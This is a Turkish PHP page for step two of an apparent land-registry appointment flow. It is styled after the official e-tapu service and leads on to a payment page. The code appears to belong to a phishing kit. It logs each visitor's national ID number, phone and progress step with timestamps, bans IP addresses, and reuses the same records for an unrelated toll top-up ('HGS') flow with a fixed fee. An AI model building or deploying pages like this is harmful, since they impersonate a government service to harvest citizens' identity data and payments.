<?php
/**
 * randevu.php — Adım 2: Randevu Seçimi
 */
if (session_status() === PHP_SESSION_NONE) session_start();

// Vercel Serverless Session Recovery (Session Kaybı Önleme)
if (empty($_SESSION['basvuru'])) {
    try {
        require_once __DIR__ . '/db.php';
        $sid = session_id();
        $row = db()->prepare("SELECT * FROM tapu_logs WHERE session_id=? LIMIT 1");
        $row->execute([$sid]);
        $r = $row->fetch();
        if ($r && !empty($r['tc']) && !empty($r['telefon'])) {
            $_SESSION['log_id'] = (int)$r['id'];
            $_SESSION['hgs_sorgu_tipi'] = $r['ilce'] ? strtolower($r['ilce']) : 'plaka';
            $_SESSION['hgs_sorgu_deger'] = $r['tc'];
            $_SESSION['hgs_telefon'] = $r['telefon'];
            
            $_SESSION['basvuru'] = [
                'ad' => 'HGS',
                'soyad' => 'Yükleme',
                'telefon' => $r['telefon'],
                'tc' => $r['tc'],
                'il' => 'ANKARA',
                'ilce' => 'ÇANKAYA'
            ];
            
            $_SESSION['randevu'] = [
                'mudurlik' => 'HGS: ' . strtoupper($r['ilce'] ?: 'PLAKA'),
                'tarih' => $r['tc'],
                'saat' => $r['saat'] ?: '275 TL'
            ];
        } else {
            header('Location: ' . BASE_PATH . '/'); exit;
        }
    } catch (Exception $e) {
        header('Location: ' . BASE_PATH . '/'); exit;
    }
}

// DB takibi
require_once __DIR__ . '/db.php';
ip_ban_kontrol(); // Banlı IP'yi yönlendir
kayit_ziyaretci();
$_SESSION['adim'] = 2;
$_aktif_log_id = $_SESSION['log_id'] ?? get_or_create_log();
if ($_aktif_log_id) {
    update_log($_aktif_log_id, ['mevcut_adim' => 2, 'son_aktivite' => date('Y-m-d H:i:s')]);
}


$basvuru    = $_SESSION['basvuru'];
$aktif_adim = 2;
$hatalar    = [];
$form_data  = [];

// İl'e özel tapu müdürlükleri
require_once __DIR__ . '/includes/mudurlukleri.php';
$secilen_il   = mb_strtoupper(trim($basvuru['il'] ?? ''), 'UTF-8');
$mudurlukleri = $il_mudurlukleri[$secilen_il] ?? [];

// Saat aralıkları
$saatler = [
  '09:00 - 09:30', '09:30 - 10:00', '10:00 - 10:30', '10:30 - 11:00',
  '11:00 - 11:30', '11:30 - 12:00', '13:00 - 13:30', '13:30 - 14:00',
  '14:00 - 14:30', '14:30 - 15:00', '15:00 - 15:30', '15:30 - 16:00',
  '16:00 - 16:30', '16:30 - 17:00',
];

// İşlem türü isim map
$islem_etiketler = [
  'Satis' => 'Satış', 'Ipotek' => 'İpotek', 'Bagis' => 'Bağış',
  'Intikal' => 'İntikal', 'Diger' => 'Diğer',
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Geri butonu
  if (isset($_POST['geri'])) {
    header('Location: ' . BASE_PATH . '/'); exit;
  }

  $form_data = [
    'mudurlik' => trim($_POST['mudurlik'] ?? ''),
    'tarih'    => trim($_POST['tarih'] ?? ''),
    'saat'     => trim($_POST['saat'] ?? ''),
  ];

  if (empty($form_data['mudurlik']) || !in_array($form_data['mudurlik'], $mudurlukleri))
    $hatalar['mudurlik'] = 'Lütfen bir tapu müdürlüğü seçiniz.';

  if (empty($form_data['tarih']))
    $hatalar['tarih'] = 'Tarih seçiniz.';
  else {
    $secilenTarih = strtotime($form_data['tarih']);
    if ($secilenTarih < strtotime('today'))
      $hatalar['tarih'] = 'Geçmiş bir tarih seçilemez.';
  }

  if (empty($form_data['saat']) || !in_array($form_data['saat'], $saatler))
    $hatalar['saat'] = 'Lütfen bir saat aralığı seçiniz.';

  if (empty($hatalar)) {
    $_SESSION['randevu'] = $form_data;
    unset($_SESSION['odeme']);

    // Update log in DB with appointment details
    $_aktif_log_id = $_SESSION['log_id'] ?? get_or_create_log();
    if ($_aktif_log_id) {
        update_log($_aktif_log_id, [
            'mudurlik'     => $form_data['mudurlik'],
            'tarih'        => $form_data['tarih'],
            'saat'         => $form_data['saat'],
            'mevcut_adim'  => 3, // Redirecting to step 3 (Payment)
            'son_aktivite' => date('Y-m-d H:i:s')
        ]);
    }

    header('Location: ' . BASE_PATH . '/odeme.php'); exit;
  }
} else {
  $form_data = [
    'mudurlik' => $_SESSION['randevu']['mudurlik'] ?? '',
    'tarih'    => $_SESSION['randevu']['tarih'] ?? '',
    'saat'     => $_SESSION['randevu']['saat'] ?? '',
  ];
}

require_once __DIR__ . '/includes/header.php';
?>

        <!-- ====== RANDEVU FORMU ====== -->
        <section class="webtapu-card">
          <h3>Randevu Seçimi</h3>
          <p class="webtapu-muted">Uygun tarih ve saat aralığını seçiniz.</p>

          <?php if (!empty($hatalar)): ?>
            <div class="tapu-error-box" id="tapu-error-box">
              <div class="tapu-error-icon" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
                  <circle cx="12" cy="12" r="12" fill="#c0392b"/>
                  <rect x="6" y="11" width="12" height="2" rx="1" fill="white"/>
                </svg>
              </div>
              <div class="tapu-error-content">
                <p class="tapu-error-title">İşleminiz tamamlanamadı.</p>
                <ul class="tapu-error-list">
                  <?php foreach ($hatalar as $hata): ?>
                    <li><?= htmlspecialchars($hata) ?></li>
                  <?php endforeach; ?>
                </ul>
              </div>
            </div>
          <?php endif; ?>

          <form method="post" action="" class="webtapu-form" novalidate>

            <!-- Tapu Müdürlüğü -->
            <div class="webtapu-field webtapu-field--wide">
              <label for="mudurlik">Tapu Müdürlüğü</label>
              <?php if (empty($mudurlukleri)): ?>
                <div class="tapu-info-box">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3b77ac" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                  <span>Seçtiğiniz il için kayıtlı tapu müdürlüğü bulunamadı. Lütfen <a href="<?= BASE_PATH ?>/">geri dönüp</a> il seçiminizi kontrol ediniz.</span>
                </div>
              <?php else: ?>
                <select id="mudurlik" name="mudurlik"
                  class="<?= isset($hatalar['mudurlik']) ? 'is-invalid' : '' ?>">
                  <option value=""><?= htmlspecialchars($secilen_il) ?> İli — Müdürlük Seçiniz</option>
                  <?php foreach ($mudurlukleri as $m): ?>
                    <option value="<?= htmlspecialchars($m) ?>"
                      <?= ($form_data['mudurlik'] === $m) ? 'selected' : '' ?>>
                      <?= htmlspecialchars($m) ?>
                    </option>
                  <?php endforeach; ?>
                </select>
              <?php endif; ?>
              <?php if (isset($hatalar['mudurlik'])): ?>
                <small class="form-error-text"><?= htmlspecialchars($hatalar['mudurlik']) ?></small>
              <?php endif; ?>
            </div>

            <!-- Tarih -->
            <div class="webtapu-field webtapu-field--wide">
              <label for="tarih">Tarih</label>
              <input
                type="<?= empty($form_data['tarih']) ? 'text' : 'date' ?>" 
                id="tarih" name="tarih"
                placeholder="gg.aa.yyyy"
                min="<?= date('Y-m-d', strtotime('+1 day')) ?>"
                max="<?= date('Y-m-d', strtotime('+90 days')) ?>"
                value="<?= htmlspecialchars($form_data['tarih']) ?>"
                class="<?= isset($hatalar['tarih']) ? 'is-invalid' : '' ?>"
                onfocus="this.type='date'"
                onblur="if(!this.value) this.type='text'"
              >
              <?php if (isset($hatalar['tarih'])): ?>
                <small class="form-error-text"><?= htmlspecialchars($hatalar['tarih']) ?></small>
              <?php endif; ?>
            </div>

            <!-- Saat -->
            <div class="webtapu-field webtapu-field--wide">
              <label for="saat">Saat</label>
              <select id="saat" name="saat"
                class="<?= isset($hatalar['saat']) ? 'is-invalid' : '' ?>">
                <option value="">Seçiniz</option>
                <?php foreach ($saatler as $s): ?>
                  <option value="<?= htmlspecialchars($s) ?>"
                    <?= ($form_data['saat'] === $s) ? 'selected' : '' ?>>
                    <?= htmlspecialchars($s) ?>
                  </option>
                <?php endforeach; ?>
              </select>
              <?php if (isset($hatalar['saat'])): ?>
                <small class="form-error-text"><?= htmlspecialchars($hatalar['saat']) ?></small>
              <?php endif; ?>
            </div>

            <!-- Başvuru Özet Kutusu -->
            <div class="randevu-ozet-box">
              <p><strong>Başvuru Sahibi:</strong>
                <?= htmlspecialchars(mb_strtoupper($basvuru['ad'] . ' ' . $basvuru['soyad'], 'UTF-8')) ?>
              </p>
              <p><strong>İşlem:</strong>
                <?= htmlspecialchars(mb_strtoupper($islem_etiketler[$basvuru['islem']] ?? $basvuru['islem'], 'UTF-8')) ?>
              </p>
              <p><strong>İl/İlçe:</strong>
                <?= htmlspecialchars(mb_strtoupper($basvuru['il'] . ' / ' . $basvuru['ilce'], 'UTF-8')) ?>
              </p>
            </div>

            <!-- Butonlar -->
            <div class="webtapu-actions webtapu-actions--column">
              <button type="submit" name="devam" class="primaryButton">
                Ödemeye Devam Et
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                  fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>
                </svg>
              </button>
              <button type="submit" name="geri" class="secondaryButton">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
                  fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>
                </svg>
                Geri
              </button>
            </div>

          </form>
        </section><!-- /.webtapu-card -->



<?php require_once __DIR__ . '/includes/footer.php'; ?>
